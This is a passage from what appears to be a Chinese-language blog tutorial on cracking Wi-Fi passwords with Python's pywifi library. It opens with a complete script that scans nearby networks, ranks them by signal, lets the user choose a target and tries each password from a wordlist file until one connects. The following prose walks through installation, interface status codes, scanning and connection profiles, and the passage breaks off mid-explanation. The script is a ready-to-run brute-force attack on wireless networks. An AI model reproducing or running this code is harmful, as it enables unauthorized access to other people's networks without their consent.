class="comment">#获取第一个无线网卡</span></span><br><span class="line">        <span class="variable language_">self</span>.wifi_status = <span class="variable language_">self</span>.iface.status()<span class="comment">#获取无线网卡状态</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.choice = <span class="variable language_">self</span>.Choice() <span class="comment">#选择是否进行wifi密码破解</span></span><br><span class="line">        <span class="variable language_">self</span>.wifi_attack(<span class="variable language_">self</span>.choice) <span class="comment">#进行wifi攻击</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wifi_attack</span>(<span class="params">self,choice</span>):</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="literal">True</span>:</span><br><span class="line">            item_dict = <span class="variable language_">self</span>.wifi_scan() <span class="comment">#扫描wifi</span></span><br><span class="line">            count,singnal_list = <span class="variable language_">self</span>.read_wifi_data(item_dict)<span class="comment">#读取wifi数据</span></span><br><span class="line">            wifi_name_attack = <span class="variable language_">self</span>.wifi_attack_choose(count,singnal_list) <span class="comment">#选择需要破解的wifi</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.wifi_crack(wifi_name_attack) <span class="comment">#破解wifi密码</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;已退出&quot;</span>)</span><br><span class="line"></span><br><span class="line">            num = <span class="built_in">input</span>(<span class="string">&quot;按任意键退出&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wifi_scan</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#扫描wifi</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在扫描wifi...&quot;</span>+ <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">2</span>) <span class="comment">#不休眠扫描不全</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.iface.scan()  <span class="comment"># 扫描附近的wifi</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.iface.scan_results():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;正在扫描...&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">               sys.exit(<span class="string">&quot;扫描失败，请检查网络连接&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;扫描完成&quot;</span>)</span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        wifi_list_parameter = &#123;<span class="string">&#x27;SSID&#x27;</span>: [], <span class="string">&#x27;Singnal level&#x27;</span>: [], <span class="string">&#x27;BSSID&#x27;</span>: [], <span class="string">&#x27;Frequency&#x27;</span>: []&#125;</span><br><span class="line">        <span class="keyword">for</span> bss <span class="keyword">in</span> <span class="variable language_">self</span>.iface.scan_results():</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(&quot;SSID: %s&quot; % bss.ssid)  # wifi名称</span></span><br><span class="line">            <span class="comment"># print(&quot;Singnal level: %s&quot; % bss.signal)  # 信号强度,信号强度是负数，越接近0网络强度越好</span></span><br><span class="line">            <span class="comment"># print(&quot;BSSID: %s&quot; % bss.bssid)  # MAC地址</span></span><br><span class="line">            <span class="comment"># # print(&quot;Encryption: %s&quot; % bss.encryption)</span></span><br><span class="line">            <span class="comment"># print(&quot;Frequency: %s&quot; % bss.freq)  # 频率 2472000为2.4G网络，5745000为5G网络</span></span><br><span class="line">            <span class="comment"># print(&quot;=&quot; * 20)</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            wifi_list_parameter[<span class="string">&#x27;SSID&#x27;</span>].append(bss.ssid)</span><br><span class="line">            wifi_list_parameter[<span class="string">&#x27;Singnal level&#x27;</span>].append(bss.signal)</span><br><span class="line">            wifi_list_parameter[<span class="string">&#x27;BSSID&#x27;</span>].append(bss.bssid)</span><br><span class="line">            wifi_list_parameter[<span class="string">&#x27;Frequency&#x27;</span>].append(bss.freq)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;*&quot;</span> * <span class="number">20</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;共扫描到%d个wifi&quot;</span> % (num-<span class="number">1</span>)) <span class="comment">#不知道为啥pywifi会多扫描一个，所以-1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> * <span class="number">20</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(wifi_list_parameter)</span></span><br><span class="line">        <span class="keyword">return</span> wifi_list_parameter</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Choice</span>(<span class="params">self</span>):<span class="comment">#选择是否进行wifi密码破解</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请保证网络开关已打开&quot;</span>+ <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="comment">#time.sleep(3)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.wifi_status == const.IFACE_DISCONNECTED:  <span class="comment"># 判断无线网卡是否连接</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;网络未连接&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;网络已连接&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#循环选择是否进行wifi密码破解</span></span><br><span class="line">            choose_2 = <span class="built_in">input</span>(<span class="string">&quot;是否进行wifi密码破解程序？(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> choose_2 == <span class="string">&quot;y&quot;</span> <span class="keyword">or</span> choose_2 == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;执行破解程序......&quot;</span>)</span><br><span class="line">                choice = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">return</span> choice</span><br><span class="line">            <span class="keyword">elif</span> choose_2 == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> choose_2 == <span class="string">&quot;no&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;正在退出程序&quot;</span>)</span><br><span class="line">                choice = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">return</span> choice</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;输入错误，请重新输入&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_wifi_data</span>(<span class="params">self,item_dict</span>):<span class="comment">#读取wifi数据，传入的item_dict为字典类型，包含wifi信息</span></span><br><span class="line">        <span class="comment">#&#123;&#x27;SSID&#x27;: &#123;&#x27;MERCURY_9CEE&#x27;, &#x27;szpjwfhm_5G&#x27;, &#x27;szpjwfhm&#x27;, &#x27;CMCC-5Z94&#x27;&#125;, &#x27;Singnal level&#x27;: &#123;-71, -70, -59, -83&#125;, &#x27;BSSID&#x27;: &#123;&#x27;cc:2d:21:e5:cc:b1:&#x27;, &#x27;cc:2d:21:e5:cc:b5:&#x27;, &#x27;6c:59:40:7e:9c:ee:&#x27;, &#x27;ec:6c:b5:ea:3f:28:&#x27;&#125;, &#x27;Frequency&#x27;: &#123;2417000, 2472000, 5745000, 2447000&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;正在处理数据...&quot;</span>)</span><br><span class="line">        <span class="comment">#将信号强度列表进行排序</span></span><br><span class="line">        wifi_list = <span class="variable language_">self</span>.indexed_quicksort(item_dict[<span class="string">&#x27;Singnal level&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;排序完成&quot;</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#读取wifi数据</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在读取wifi数据...&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">20</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        wifi_signal_list = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(wifi_list)):</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在读取第%d个wifi数据...&quot;</span> % (num))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;WiFi编号：%d&quot;</span> % (num))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;名称：%s&quot;</span> % item_dict[<span class="string">&#x27;SSID&#x27;</span>][wifi_list[i]])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;MAC地址：%s&quot;</span> % item_dict[<span class="string">&#x27;BSSID&#x27;</span>][wifi_list[i]])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;频率：%s&quot;</span> % item_dict[<span class="string">&#x27;Frequency&#x27;</span>][wifi_list[i]])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;信号强度：%s&quot;</span> % item_dict[<span class="string">&#x27;Singnal level&#x27;</span>][wifi_list[i]])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">            wifi_signal_list.append(item_dict[<span class="string">&#x27;SSID&#x27;</span>][wifi_list[i]])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;读取完成&quot;</span>)</span><br><span class="line">        <span class="comment">#print(wifi_signal_list)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;*&quot;</span> * <span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> i,wifi_signal_list</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wifi_attack_choose</span>(<span class="params">self,count,singnal_list</span>):<span class="comment">#选择需要破解的wifi</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 选择需要破解的wifi</span></span><br><span class="line">            choose_wifi = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入需要破解的wifi的编号：&quot;</span>)) - <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> choose_wifi &lt; <span class="number">0</span> <span class="keyword">or</span> choose_wifi &gt; count:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;输入错误，请重新输入&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        wifi_name_attack = singnal_list[choose_wifi]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在破解wifi：%s&quot;</span> % wifi_name_attack)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> wifi_name_attack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wifi_crack</span>(<span class="params">self,wifi_name_attack</span>):<span class="comment">#破解wifi密码</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在破解wifi密码...&quot;</span>)</span><br><span class="line">        <span class="comment"># 读取字典文件</span></span><br><span class="line">        <span class="comment"># 字典文件格式：text</span></span><br><span class="line"></span><br><span class="line">        path = <span class="string">&quot;wifi_password.txt&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">            data = data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> try_password <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line">                <span class="comment">#print(line)</span></span><br><span class="line"></span><br><span class="line">                profile = Profile()</span><br><span class="line">                profile.ssid = wifi_name_attack  <span class="comment"># wifi名称</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 网卡开放状态</span></span><br><span class="line">                <span class="comment"># &quot;Auth - AP&quot; 验证算法</span></span><br><span class="line">                profile.auth = const.AUTH_ALG_OPEN</span><br><span class="line"></span><br><span class="line">                <span class="comment"># WiFi的加密算法为&quot;WPA&quot;</span></span><br><span class="line">                <span class="comment"># 选择WiFi加密算法</span></span><br><span class="line">                <span class="comment"># &quot;Akm - AP&quot; 的密钥管理</span></span><br><span class="line">                profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 加密单元</span></span><br><span class="line">                <span class="comment"># &quot;Cipher - AP&quot; 密码类型</span></span><br><span class="line">                profile.cipher = const.CIPHER_TYPE_CCMP  <span class="comment"># 加密单元</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 设置密码</span></span><br><span class="line">                profile.key = try_password  <span class="comment"># wifi密码</span></span><br><span class="line"></span><br><span class="line">                <span class="variable language_">self</span>.iface.remove_all_network_profiles()  <span class="comment"># 删除所有wifi配置文件</span></span><br><span class="line"></span><br><span class="line">                <span class="variable language_">self</span>.iface.add_network_profile(profile)  <span class="comment"># 添加wifi配置文件</span></span><br><span class="line"></span><br><span class="line">                <span class="variable language_">self</span>.iface.connect(profile)  <span class="comment"># 连接wifi</span></span><br><span class="line">                time.sleep(<span class="number">1</span>) <span class="comment">#等待连接,这个可以防止连接过快导致无法连接</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.iface.status() == const.IFACE_CONNECTED:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;密码: %s 校验成功&quot;</span> % try_password)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;密码: %s 校验失败&quot;</span> % try_password)</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">indexed_quicksort</span>(<span class="params">self, array</span>):</span><br><span class="line">        <span class="comment"># 创建一个包含 (值, 原始索引) 的列表</span></span><br><span class="line">        arr_with_index = [(value, index) <span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(array)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 快速排序函数，对 arr_with_index 进行排序</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">quicksort</span>(<span class="params">arr</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt;= <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> arr</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 随机选择基准元素</span></span><br><span class="line">                pivot_index = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(arr) - <span class="number">1</span>)</span><br><span class="line">                pivot = arr[pivot_index][<span class="number">0</span>]</span><br><span class="line">                left = []  <span class="comment"># 小于基准的元素</span></span><br><span class="line">                right = []  <span class="comment"># 大于基准的元素</span></span><br><span class="line">                middle = []  <span class="comment"># 等于基准的元素</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> value, original_index <span class="keyword">in</span> arr:</span><br><span class="line">                    <span class="keyword">if</span> value &lt; pivot:</span><br><span class="line">                        left.append((value, original_index))</span><br><span class="line">                    <span class="keyword">elif</span> value &gt; pivot:</span><br><span class="line">                        right.append((value, original_index))</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        middle.append((value, original_index))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> quicksort(right) + middle + quicksort(left)  <span class="comment"># 将较大的元素放在前面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 执行快速排序</span></span><br><span class="line">        sorted_arr_with_index = quicksort(arr_with_index)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取排序后的值和原始索引</span></span><br><span class="line">        <span class="comment">#sorted_values = [value for value, _ in sorted_arr_with_index]  # 获取排序后的值</span></span><br><span class="line">        sorted_original_indices = [index <span class="keyword">for</span> _, index <span class="keyword">in</span> sorted_arr_with_index]  <span class="comment"># 获取排序后的值的原始索引，用来匹配WiFi的信息</span></span><br><span class="line">        <span class="comment">#print(sorted_original_indices)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sorted_original_indices</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    wifi_attack = wifi_attack_main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>首先，你需要安装pywifi库，同时下载pywifi的依赖库，命令如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pip install pywifi</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pip install comtypes</span><br></pre></td></tr></table></figure></div>

<p>没有<code>comtypes</code>库<code>pywifi</code>库是不能运行的，这个要注意。</p>
<hr>
<h3 id="代码解析-思路分析"><a href="#代码解析-思路分析" class="headerlink" title="代码解析:思路分析"></a>代码解析:思路分析</h3><p>功能：</p>
<ol>
<li><p>判断自身是否连接到wifi</p>
</li>
<li><p>选择是否进行wifi密码破解</p>
</li>
<li><p>进行破解</p>
</li>
</ol>
<hr>
<h3 id="代码解析-pywifi库的基本使用"><a href="#代码解析-pywifi库的基本使用" class="headerlink" title="代码解析:pywifi库的基本使用"></a>代码解析:pywifi库的基本使用</h3><hr>
<p>先列出基本的用法代码</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pywifi</span><br><span class="line"><span class="keyword">from</span> pywifi <span class="keyword">import</span> const</span><br><span class="line"></span><br><span class="line"><span class="comment">#  1. 基础</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  获取网卡接口</span></span><br><span class="line">wifi = pywifi.PyWiFi()</span><br><span class="line"></span><br><span class="line"><span class="comment">#  得到第一个无线网卡</span></span><br><span class="line">ifaces = wifi.interfaces()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#  切断网卡连接</span></span><br><span class="line"><span class="comment">#ifaces.disconnect()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  获取wifi的连接状态</span></span><br><span class="line">wifistatus = ifaces.status()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(wifistatus)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  检查wifi是否处于切断状态</span></span><br><span class="line"><span class="keyword">if</span> wifistatus == const.IFACE_DISCONNECTED:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  网卡已被切断</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  如果网卡没有被切断</span></span><br><span class="line"><span class="comment">#  或者使用 &quot; if wifistatus == const.IFACE_CONNECTED: &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  已连接wifi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  如果已经切断网卡，一般执行下述操作</span></span><br><span class="line"><span class="keyword">if</span> wifistatus == const.IFACE_DISCONNECTED:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  设置wifi连接文件</span></span><br><span class="line">    profile = pywifi.Profile()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  你要连接的网络的名称</span></span><br><span class="line">    profile.ssid = <span class="string">&quot;    &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#  网卡的开放状态</span></span><br><span class="line">    <span class="comment">#  &quot; Auth - AP &quot;的验证算法</span></span><br><span class="line">    profile.auth = const.AUTH_ALG_OPEN</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  wifi的加密算法</span></span><br><span class="line">    <span class="comment">#  通常的加密算法值为 &quot; WPA &quot;</span></span><br><span class="line">    <span class="comment">#  选择wifi的加密方式</span></span><br><span class="line">    <span class="comment">#  &quot; Akm - AP &quot;的密钥管理</span></span><br><span class="line">    profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  加密单元</span></span><br><span class="line">    <span class="comment">#  &quot; Cipher - AP &quot;的密码类型</span></span><br><span class="line">    profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  设置密码</span></span><br><span class="line">    password = <span class="string">&quot;   &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#  回调密码（wifi密码）</span></span><br><span class="line">    <span class="comment">#  如果没有密码，则设置值为 &quot; CIPHER_TYPE_NONE &quot;</span></span><br><span class="line">    profile.key = password</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  删除已连接的所有wifi文件</span></span><br><span class="line">    ifaces.remove_all_network_profiles()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  加载新的wifi连接文件</span></span><br><span class="line">    tep_profile = ifaces.add_network_profile(profile)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  连接上面的wifi文件</span></span><br><span class="line">    ifaces.connect(tep_profile)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  如果wifi已连接</span></span><br><span class="line">    <span class="keyword">if</span> ifaces.status() == const.IFACE_CONNECTED:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  如果仍未连接</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>

<hr>
<h4 id="pywifi代码基础讲解"><a href="#pywifi代码基础讲解" class="headerlink" title="pywifi代码基础讲解"></a>pywifi代码基础讲解</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pywifi</span><br><span class="line"><span class="keyword">from</span> pywifi <span class="keyword">import</span> const, Profile</span><br></pre></td></tr></table></figure></div>

<p>首先，导入<code>pywifi</code>库和<code>const</code>和<code>Profile</code>模块。</p>
<p><code>const</code>模块提供了一些常量，用于表示一些常用的状态和参数。</p>
<p><code>Profile</code>模块用于创建wifi配置文件。</p>
<p><code>const</code>这个是必须要导入的，因为<code>pywifi</code>库的很多功能都是基于<code>const</code>这个模块的，没有这个<code>const</code>模块，<code>pywifi</code>库是不能运行的。</p>
<p><code>Profile</code>这个模块可以创建wifi配置文件，用于连接wifi,这个可有可无，可以根据自己的需求选择是否导入。</p>
<hr>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">wifi = pywifi.PyWiFi()</span><br></pre></td></tr></table></figure></div>

<p>创建<code>wifi</code>对象，这个对象是用来管理wifi的。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">iface = wifi.interfaces()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></div>

<p>获取第一个无线网卡，这个网卡是用来连接wifi的。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">wifi_status = iface.status()</span><br></pre></td></tr></table></figure></div>

<p><code>iface.status()</code>方法可以获取无线网卡的状态(获取数字：0-未连接，1-正在扫描，2-未激活，3-正在连接，4-已连接)，这个状态有四种状态:</p>
<ul>
<li><code>const.IFACE_DISCONNECTED</code> 未连接 </li>
<li><code>const.IFACE_SCANNING</code> 正在扫描</li>
<li><code>const.IFACE_CONNECTING</code> 正在连接</li>
<li><code>const.IFACE_CONNECTED</code> 已连接</li>
</ul>
<p>在<code>pywifi</code>库中，这几个状态有不同的数字表示，大家可以按<code>ctrl</code>然后<strong>点击鼠标左键</strong>，可以查看到具体的数字表示，在这里我直接列出来了。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">IFACE_DISCONNECTED = <span class="number">0</span> <span class="comment">#未连接</span></span><br><span class="line">IFACE_SCANNING = <span class="number">1</span> <span class="comment">#正在扫描</span></span><br><span class="line">IFACE_INACTIVE = <span class="number">2</span> <span class="comment">#未激活</span></span><br><span class="line">IFACE_CONNECTING = <span class="number">3</span> <span class="comment">#正在连接</span></span><br><span class="line">IFACE_CONNECTED = <span class="number">4</span> <span class="comment">#已连接</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>所以，我们可以先根据这行代码判断我们的联网状态，不过有一点是，如果没有打开网络开关怎么办？<br>好问题，python里面好像没有能够打开网络开关的方法，这个问题我们留到后面讲，单纯写一个<strong>网络未打开的提示</strong>就好了。</p>
</blockquote>
<p>我们如果要破解WiFi密码，我们需要先扫描到目标WiFi，所以我们需要先获取到目标WiFi的相关信息，所以我们需要先扫描到目标WiFi。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">iface.scan()  <span class="comment"># 扫描附近的wifi</span></span><br><span class="line"></span><br><span class="line">iface.scan_results()  <span class="comment"># 获取扫描结果</span></span><br></pre></td></tr></table></figure></div>

<p><code>iface.scan()</code>方法可以扫描附近的wifi，<code>iface.scan_results()</code>方法可以获取扫描结果。</p>
<p><code>iface.scan()</code>是不返回任何的输出结果的，想要知道结果必须要用<code>iface.scan_results()</code>方法。</p>
<p>当然，<code>iface.scan_results()</code>方法返回的是一个列表，要是单纯的打印的话，会发现这东西根本就看不懂。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">[&lt;pywifi.profile.Profile <span class="built_in">object</span> at <span class="number">0x000001DA521032C0</span>&gt;, &lt;pywifi.profile.Profile <span class="built_in">object</span> at <span class="number">0x000001DA52103350</span>&gt;, &lt;pywifi.profile.Profile <span class="built_in">object</span> at <span class="number">0x000001DA52103380</span>&gt;, &lt;pywifi.profile.Profile <span class="built_in">object</span> at <span class="number">0x000001DA521033B0</span>&gt;, &lt;pywifi.profile.Profile <span class="built_in">object</span> at <span class="number">0x000001DA521033E0</span>&gt;]</span><br></pre></td></tr></table></figure></div>

<p><strong>这我TM的怎么看？</strong></p>
<p>后面，我们会解决这个问题，先暂时不管这个问题。</p>
<blockquote>
<p><strong>但是，我们需要注意的一点是，<code>iface.scan_results()</code>包含了很多wifi的相关信息,包括wifi的名称，信号强度，MAC地址，频率等等。</strong></p>
</blockquote>
<hr>
<p><strong>剩下的代码就是我们的最为核心的部分，WiFi的连接.</strong></p>
<p>wifi的连接，我们需要先创建一个wifi配置文件。</p>
<p>这个配置文件的属性有：WiFi名称，WiFi密码，加密算法，加密单元。</p>
<p>所以一开始我们要创建一个WiFi配置文件。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">profile = Profile() <span class="comment">#需要 from pywifi import Profile</span></span><br><span class="line"></span><br><span class="line">profile = pywifi.Profile() <span class="comment">#不需要 from pywifi import Profile</span></span><br></pre></td></tr></table></figure></div>

<p>创建<code>profile</code>对象，这个对象是用来创建wifi配置文件的。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">profile.ssid = <span class="string">&quot;WiFi名称&quot;</span> <span class="comment">#WiFi名称</span></span><br><span class="line">profile.key = <span class="string">&quot;WiFi密码&quot;</span> <span class="comment">#WiFi密码</span></span><br><span class="line">profile.auth = const.AUTH_ALG_OPEN <span class="comment">#认证算法</span></span><br><span class="line">profile.akm.append(const.AKM_TYPE_WPA2PSK) <span class="comment">#加密单元</span></span><br><span class="line">profile.cipher = const.CIPHER_TYPE_CCMP <span class="comment">#加密单元</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>profile.ssid</code>是wifi的名称</p>
</li>
<li><p><code>profile.key</code>是wifi的密码</p>
</li>
<li><p><code>profile.auth</code>是认证算法，这个是必须要设置的，常用的加密算法有：<code>const.AUTH_ALG_OPEN</code>（开放），<code>const.AUTH_ALG_SHARED</code>（共享）。</p>
</li>
